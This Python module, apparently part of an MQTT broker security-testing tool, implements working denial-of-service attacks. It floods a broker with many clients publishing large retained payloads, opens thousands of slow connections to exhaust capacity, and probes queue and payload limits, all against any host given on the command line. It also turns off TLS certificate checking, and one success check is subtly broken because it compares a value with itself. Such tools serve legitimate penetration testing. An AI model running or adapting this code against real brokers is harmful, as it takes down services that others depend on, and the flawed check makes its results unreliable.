import ssl, time
import paho.mqtt.client as mqtt
from paho.mqtt.packettypes import PacketTypes
from paho.mqtt.properties import Properties
from statistics import mean
import argparse

# To stay consitent with Sniffing attack
class Credentials:
    def __init__(self):
        # boolean flag used to check if the object is empty or not
        self.empty = True
        self.clientID = None
        self.username = None
        self.password = None

    def add_clientID(self, clientID):
        self.empty = False
        self.clientID = clientID
    def add_username(self, username):
        self.empty = False
        self.username = username
    def add_password(self, password):
        self.empty = False
        self.password = password
        
connected = 0
connection_difference = 0
percentage_increment = 0
slow_connection_difference = 0

publish_times = []

max_queue = 0
max_payload = 0

# MQTT5 - enforces the persistent session
def gen_connect_properties():
    connect_properties = Properties(PacketTypes.CONNECT)
    connect_properties.SessionExpiryInterval = 86400 #0x11 - 1 day
    return connect_properties
    
def on_connect_3(client, userdata, flags, rc):
    '''print(f"\n\n{client._client_id.decode()} connection. Result: {mqtt.connack_string(rc)} Code: {rc}", flush=True)
    if (userdata):
        print("- Userdata "+ str(userdata), flush=True)
    if (flags): #Reveals if session is already present
        print("- Flags "+ str(flags), flush=True)'''
    client.on_connect_received = True
    global connected
    if (rc == 0):
        connected +=1

def on_connect_5(client, userdata, flags, reasonCode, properties):
    '''if (properties):
        print(f"{client._client_id.decode()} properties {properties}", flush=True)'''
    on_connect_3(client, userdata, flags, reasonCode)

def on_subscribe_3(client, userdata, mid, granted_qos):
    '''print(f"\n\n{client._client_id.decode()} subscribed. Message ID: {mid}", flush=True)
    for q in granted_qos:
        print("-Granted QoS: " + str(q), flush=True)
    if (userdata):
        print("-Userdata: "+ str(userdata), flush=True)'''
    client.on_subscribe_received = True
    
    if (client.test_name == "queue"):
        client.ready_to_disconnect = True # called only the first time, not when re-issuing the subscriber (set to false in the init)

def on_subscribe_5(client, userdata, mid, reasonCodes, properties):
    '''if (properties):
        print(f"{client._client_id.decode()} properties {properties}", flush=True)'''
    on_subscribe_3(client, userdata, mid, reasonCodes)
    
def on_message(client, userdata, msg):
    '''print(f"Message received by {client._client_id.decode()}. Topic {msg.topic}, QoS {msg.qos}", flush=True)
    #print(f"Payload {msg.payload})
    if (userdata):
        print("-Userdata "+ str(userdata), flush=True)'''
    client.received_payload = True
    
    if (client.ready_to_disconnect):
        #print(f"Disconnecting {client._client_id.decode()}")
        client.disconnect()
        client.loop_stop()
    else:
        client.received_msg += 1      
        print(f"Received_msg: {client.received_msg}")
        
def on_publish(client, userdata, mid):
    global publish_times
    
    if (client.test_name == "avg_publish_time"):
        publish_times.append( (time.time() * 1000) - client.pre_publish)
    elif (client.test_name == "queue"):
        client.published_msg += 1
        client.on_publish_received = True

   
def set_callbacks_and_parameters(client, test_name, credentials, cert_key_paths):
    #Set username, password, and eventually the certificate and keys (only the clientID must be unique)
    if (not credentials.empty):
        client.username_pw_set(credentials.username, credentials.password)
    if(cert_key_paths[0]!=None):
        client.tls_set(cert_key_paths[0], cert_key_paths[1], cert_key_paths[2], ssl.CERT_NONE, tls_version=ssl.PROTOCOL_TLS, ciphers=None)
        client.tls_insecure_set(True) #allow to test scenarios with self-signed certificates

    #Set the rest of methods/properties shared between the publisher and subscriber
    if(client._protocol == 5):
        client.on_connect = on_connect_5
        client.on_subscribe = on_subscribe_5
    else:
        client.on_connect = on_connect_3
        client.on_subscribe = on_subscribe_3
    
    client.test_name = test_name

    client.on_message = on_message
    client.on_publish = on_publish
    client.on_connect_received = False
    client.on_subscribe_received = False
    client.on_publish_received = False

    client.received_msg = 0
    client.published_msg = 0
    client.ready_to_disconnect = False
    client.received_payload = False

def init_client(host, version, port, keepalive, test_name, cID, clean, credentials, cert_key_paths):
    
    if version == '5':
        client = mqtt.Client(cID, protocol=mqtt.MQTTv5)
        #ClientID, name of the test to perform, credentials and certificates
        set_callbacks_and_parameters(client, test_name, credentials, cert_key_paths)
        if(test_name == "slow_dos"):
            client.connect_async(host, port, keepalive, clean_start = clean, properties=gen_connect_properties())
        else:
            client.connect(host, port, keepalive, clean_start = clean, properties=gen_connect_properties())
    else:
        client = mqtt.Client(cID, clean_session=clean, protocol=mqtt.MQTTv311)
        set_callbacks_and_parameters(client, test_name, credentials, cert_key_paths)
        if(test_name == "slow_dos"):
            client.connect_async(host, port, keepalive)
        else:
            client.connect(host, port, keepalive)

    client.loop_start()
    return client

def get_avg_publish_time(host, version, port, topic, credentials, cert_key_paths):
    global publish_times
    global connected
    
    # Init the client that will record publish delays - no on_connect
    # Set clientID, username, password or certificates as required
    client = init_client(host, version, port, 60, "avg_publish_time", "Time_publisher", True, credentials, cert_key_paths)
    
    timeout_timer = 0
    while(timeout_timer <= 10):
        if (client.on_connect_received):
            break
        else:
            timeout_timer +=1
            time.sleep(1)
            
    if(timeout_timer == 10): return None
    connected -= 1 # avoids inconsistencies with the number of connected clients
    try:
        # Set pre-publish timestamps to compare them with on_publish ones
        for x in range (100):
            #time.sleep(.1)
            client.pre_publish = time.time() * 1000
            client.publish(topic,"DoSMessage"+str(x+1), qos=1)
        
        print("Waiting for all publish acknowledgment (press ctrl+c once to skip):")
        # Wait for all ack to arrive or 30s timeout
        for x in range (30):
            if(len(publish_times) == 100):
                print("All acknowledgment received")
                break
            else:
                if (x % 10 == 0):
                    print(str(30-x) + " seconds remaining") # print each 10s
                time.sleep(1)
    except KeyboardInterrupt:
        print("Skipping the function to get average publish time")
        pass
    except:
        print("Error while connecting and evaluating average publish time")
        pass

    # Does not raise exceptions if does not manage to connect
    client.loop_stop() 
    client.disconnect()
 
def flooding_dos(host, version, port, credentials, cert_key_paths, connections, payload_size, topic, wait_time):
    global connected
    global connection_difference
    global percentage_increment
    global publish_times
    connected = 0 # reset the connected counter
    mqtt_clients = [] #An array containing all clients for publishing
        
    #Send 100 messages and store the time between sending a QoS 1 message and receiving the acknowledgment
    get_avg_publish_time(host, version, port, topic, credentials, cert_key_paths)
    pre_test_measures = mean(publish_times) if (publish_times) else 0
    publish_times = [] # Clean the list
    
    #Init and connect all clients - no on_publish
    for x in range(connections):
        mqtt_clients.append(init_client(host, version, port, 60, "flooding", "Client_flooding_"+str(x), True, credentials, cert_key_paths))
    
    #Wait for all clients connections or X seconds timeout
    try:
        print(str(wait_time) + " seconds timeout for flooding-based DoS (press ctrl+c once to skip):")
        for x in range (wait_time):
            if(int(connections)-connected == 0):
                print("All flooding DoS clients connected")
                break;
            else:
                if (x % 10 == 0):
                    print(str(wait_time-x) + " seconds remaining") # print each 10s
                    print(f"Connected: {connected}, Connection: {connections}")
                time.sleep(1)
    except KeyboardInterrupt:
        pass
    
    #payload_size (MB)
    payload = "0" * 1024 * 512 * payload_size
    
    print("Starting flooding-based DoS publishing - "+ str(payload_size) +" MB")
    for client in mqtt_clients:
        client.publish(topic+"/"+client._client_id.decode(),payload,0,True) #Set retain to True to possibly affect also I/O

    #Send 100 messages and store the time between sending a QoS 1 message and receiving the acknowledgment
    get_avg_publish_time(host, version, port, topic, credentials, cert_key_paths)
    post_test_measures =  mean(publish_times) if (publish_times) else 0
    publish_times = []

    for client in mqtt_clients:
        client.publish(topic+"/"+client._client_id.decode(),"",0,True) #Clean from retained messages
        #client.loop_stop() #Commented out to save time (not really necessary)
        #client.disconnect()

    if(pre_test_measures != 0 and post_test_measures != 0):
        percentage_increment = ((post_test_measures - pre_test_measures)/pre_test_measures)*100
        print("Flooding DoS - pre-sending time: " + str(round(pre_test_measures))+"ms")
        print("Flooding DoS - post-sending time: " + str(round(post_test_measures))+"ms")
        print("Flooding DoS - Time_increment: " + str(round(percentage_increment))+"%")

    connection_difference = (connections-connected)
    
    #If not all clients managed to connect or there is an increment in publish time of more than 100% DoS is succesfull
    if (connection_difference != 0 or percentage_increment > 100):
        print("Flooding DoS - Connection difference: " + str(connection_difference))
        return True
    else:
        return False

def slow_dos(host, version, port, credentials, cert_key_paths, max_connections, wait_time):
    global connected
    global slow_connection_difference
    connected = 0 # reset the connected counter
    #mqtt_clients = [] #Used to disconnect clients
    
    for x in range(max_connections):
        init_client(host, version, port, wait_time, "slow_dos", "Client_slow_"+str(x), True, credentials, cert_key_paths)
        #time.sleep(.1) #Avoids socket error with many connections (e.g., over 8k)


    #Wait for all clients connections or X seconds timeout
    try:
        print(str(wait_time//60) +" minutes timeout for slow DoS (press ctrl+c once to skip):")
        for x in range (wait_time):
            if(max_connections-connected == 0):
                print("All "+str(max_connections)+" connections succeeded")
                break;
            else:
                if (x % 60 == 0):
                    print(str((wait_time-x)//60) + " minutes remaining")
                time.sleep(1)
    except KeyboardInterrupt:
        pass

    #Disconnect all clients #Commented out to save time (not really necessary)
    #for client in mqtt_clients:
    #    client.loop_stop()
    #    client.disconnect()

    slow_connection_difference = max_connections-connected
           
    #If not all clients managed to connect DoS is succesfull
    if (connected > 0 and slow_connection_difference != 0):
        print("Slow DoS succesfull, max connections allowed: "+ str(connected))
        return True
    else:
        return False

def get_max_queue(host, version, port, credentials, cert_key_paths, num_msg_to_publish, topic, qos):
    #Connect two clients to the broker (with clean session): a publisher and a subscriber; the latter disconnects and reconnects later (with persistent session) to receive <num_msg_to_publish> messages
    print(f"Queue message test - attempting the sending of {num_msg_to_publish} messages", flush=True)
    
    publisher = init_client(host, version, port, 60, "queue", "mqttsaPublisher", True, credentials, cert_key_paths)
    subscriber = init_client(host, version, port, 60, "queue", "mqttsaSubscriber", False, credentials, cert_key_paths)
    
    timeout_timer = 0
        
    while(timeout_timer <= 10):
        if (publisher.on_connect_received and subscriber.on_connect_received):
            #print(f"\nOut of connacks after {timeout_timer}s", flush=True)
            break
        else:
            timeout_timer +=1
            time.sleep(1)
    
    #Exit if timeout is reached (else reset timer)
    if(timeout_timer == 10): return None
    timeout_timer = 0
    
    #Subscribes to the test topic and disconnect upon receiving the first message (see on_message)
    subscriber.subscribe(topic, qos)
    
    while(timeout_timer <= 10):
        if (subscriber.on_subscribe_received):
            #print(f"\nOut of suback after {timeout_timer}s", flush=True)
            break
        else:
            timeout_timer +=1
            time.sleep(1)

    #Exit if timeout is reached (else reset timer)
    if(timeout_timer == 10): return None
    timeout_timer = 0

    #Attempt the publishing of <num_msg_to_publish> messages (the first is discarded - used to disconnect the connected subscriber
    #a timeout is present (max 10 sec to receive the message) in case it is not allowed the publishing of <num_msg_to_publish> messages
    for i in range (1,num_msg_to_publish+1):
        publisher.publish(topic, f"MSG:{i}", qos)
        while (timeout_timer <= 100 and not publisher.on_publish_received):
            time.sleep(.1)
            timeout_timer += 1
        publisher.on_publish_received = False
        #print(f"On_publish received for MSG:{i}")
        if(timeout_timer == 100):
            break
        else:
            timeout_timer = 0
    
    timeout_timer = 0
    
    publisher.disconnect()
    publisher.loop_stop()
    
    #Re-init the subscriber to receive queued messages (does not need to subscribe)
    subscriber = init_client(host, version, port, 60, "queue", "mqttsaSubscriber", False, credentials, cert_key_paths)
    
    # Temporary fix - for some reason it skips the first (although with another mosquitto_sub all messages are sent)
    subscriber.received_msg+= 1 

    # Wait at most 10 seconds and exit if all published messages have been received
    while(timeout_timer <= 10 and subscriber.received_msg != publisher.published_msg):
        print(f"{subscriber.received_msg} messages received, {10-timeout_timer}s remaining")
        timeout_timer +=1
        time.sleep(1)
        
    subscriber.disconnect()
    subscriber.loop_stop()
    
    print(f"Received from queue {subscriber.received_msg}/{publisher.published_msg} messages", flush=True)
        
    return subscriber.received_msg
    
def get_max_payload(host, version, port, credentials, cert_key_paths, max_payload_to_test, topic, qos):
    
    publisher = init_client(host, version, port, 60, "payload", "mqttsaPublisher", True, credentials, cert_key_paths)
    subscriber = init_client(host, version, port, 60, "payload", "mqttsaSubscriber", True, credentials, cert_key_paths)
    
    timeout_timer = 0
    
    while(timeout_timer <= 10):
        if (publisher.on_connect_received and subscriber.on_connect_received):
            break
        else:
            timeout_timer +=1
            time.sleep(1)

    #Exit if timeout is reached (else reset timer)
    if(timeout_timer == 10): return None
    timeout_timer = 0
    
    #Subscribes to the test topic and disconnect upon receiving the first message (see on_message)
    subscriber.subscribe(topic, qos)
    
    while(timeout_timer <= 10):
        if (subscriber.on_subscribe_received):
            break
        else:
            timeout_timer +=1
            time.sleep(1)

    if(timeout_timer == 10): return None
    timeout_timer = 0

    max_payload = 0
    
    for i in range (0, max_payload_to_test+1, 5):
        #Payload in MB (1 and 5 by 5 to 255MB)
        if (i == 0):
            print("Sending the 1MB message")
            payload = "0" * 1024 * 1024 * 1
            wait_time = 10
        else:
            payload = "0" * 1024 * 1024 * i
            wait_time = 5 * i
            print(f"Sending the {i}MB message - {wait_time}s timeout (skip with ctrl+c)")
            time.sleep(1)
            
        try:
            publisher.publish(topic, payload, qos)
            
            while(timeout_timer <= wait_time):
                if (subscriber.received_payload):
                    print("- Received")
                    timeout_timer = 0 # Reset the timer
                    subscriber.received_payload = False
                    break
                else:
                    timeout_timer += 1
                    time.sleep(1)
            
            #If it reached the timeout, exit the for loop; else set the current max_payload
            if (timeout_timer == wait_time): break
            max_payload = i
            
        except KeyboardInterrupt:
            print("Skipping the rest of the payload size test")
            break
    
    print(f"Max payload: {max_payload}")
    return max_payload


def broker_dos(host, version, port, credentials, connections, payload_size, slow_connections, max_queue_to_test, max_payload_to_test, topic, cert_key_paths):
    global max_queue
    global max_payload
    res1 = False
    res2 = False
    res3 = False
    
    if (not credentials.empty):
        print ("DoS client credentials:\n - ID: " + credentials.clientID + " U: "+ credentials.username + " P: "+ credentials.password)

    if(connections!=None):
        res1 = flooding_dos(host, version, port, credentials, cert_key_paths, connections, payload_size, topic, 60)
        
    if(slow_connections!=None):
        #For the TTL/wait time, we consider 3k connections each minute as reference (and double the time); at least 60s
        time = (int(slow_connections*0.04)) if (slow_connections*0.04 > 60) else 60
        res2 = slow_dos(host, version, port, credentials, cert_key_paths, slow_connections, time)

    if (max_queue_to_test!=None):
        max_queue = get_max_queue(host, version, port, credentials, cert_key_paths, max_queue_to_test, topic, 2)
        if(max_queue >= max_queue):
            res3 = True
    
    if (max_payload_to_test!=None):
        max_payload = get_max_payload(host, version, port, credentials, cert_key_paths, max_payload_to_test, topic, 1)
        if(max_payload == max_payload_to_test):
            res3 = True
        
    return (res1 or res2 or res3)

# used for testing purposes
if __name__ == "__main__":

    # parse args
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)

    parser.add_argument(metavar='*broker_address*', type=str, dest='broker_address', help='Specify the broker IP address or hostname')
    parser.add_argument('-v', dest='version', type=str, default = '3.1.1', help='Specify the protocol version (3.1.1 by default)')
    parser.add_argument('-p', type=int, dest='port', default=1883, help='broker port (def. 1883)')

    parser.add_argument('--topic', type=str, default='DoS_Topic', help='Topic (def. "DoS_Topic")')

    parser.add_argument('-fc', dest='dos_fooding_conn', type=int, default=10, help='Specify the amount of connections for the flooding-based DoS (defaults to 10)')
    parser.add_argument('-fcsize', dest='dos_size', type=int, default = 10, help='Specify the payload size in MB for the flooding-based DoS (defaults to 10)')
    parser.add_argument('-sc', dest='dos_slow_conn', type=int, default = 2000, help='Specify the max amount of connections for the slow DoS (defaults to 2000)')
    parser.add_argument('-mq', dest='max_queue', type=int, default = 1000, help='Specify the number of messages to test the message queue size (defaults to 1000)')
    parser.add_argument('-mp', dest='max_payload', type=int, default = 255, help='Specify the payload size to test the max supported payload (defaults to 255)')

    
    parser.add_argument('-id', dest = 'clientID', type=str, default=None, help='client ID')
    parser.add_argument('-usr', dest = 'username', type=str, default=None, help='client username')
    parser.add_argument('-pwd', dest = 'password', type=str, default=None, help='client password')

    parser.add_argument('-ca', dest = 'ca_cert_path', type=str, default=None, help='CA certificate path')  
    parser.add_argument('-cert', dest = 'client_cert_path', type=str, default=None, help='Client certificate path')
    parser.add_argument('-key', dest = 'client_key_path', type=str, default=None, help='Client key path')   

    args = parser.parse_args()

    credentials = Credentials()
    
    if(args.clientID != None):
        credentials.add_clientID(args.clientID)        
    if(args.username != None and args.password != None):
        credentials.add_username(args.username)
        credentials.add_password(args.password)

    if args.dos_fooding_conn == None or args.dos_fooding_conn < 1:
        print('[!] "dos_fooding_conn" parameter < 1 or null, no flooding-based DoS attack')
        args.dos_fooding_conn = None
    if args.dos_slow_conn == None or args.dos_slow_conn < 1:
        print('[!] "dos_slow_conn" parameter < 1 or null, no slow-DoS attack')
        args.dos_slow_conn = None
    if args.max_queue == None or args.max_queue < 1:
        print('[!] "max_queue" parameter < 0 or null, no message queue test')
        args.max_queue = None
    if args.max_payload == None or args.max_payload < 1:
        print('[!] "max_payload" parameter < 0 or null, no payload size test')
        args.max_payload = None
    
    print("DoS test completed. Result: " + str(
        broker_dos(args.broker_address, args.version, args.port, 
        credentials, 
        args.dos_fooding_conn, args.dos_size, args.dos_slow_conn,
        args.max_queue,
        args.max_payload,
        args.topic,         
        [args.ca_cert_path, args.client_cert_path, args.client_key_path])
        ))
        
    if(args.dos_slow_conn or args.max_queue or args.max_payload):
        print("DoS info:")
        print("Max supported payload: " + (str(max_payload) if (args.max_payload) else "Skipped"))
        print("Messages queues:       " + (str(max_queue) if (args.max_queue) else "Skipped"))  
        print("Max connected clients: " + (str(connected) if (args.dos_slow_conn) else "Skipped"))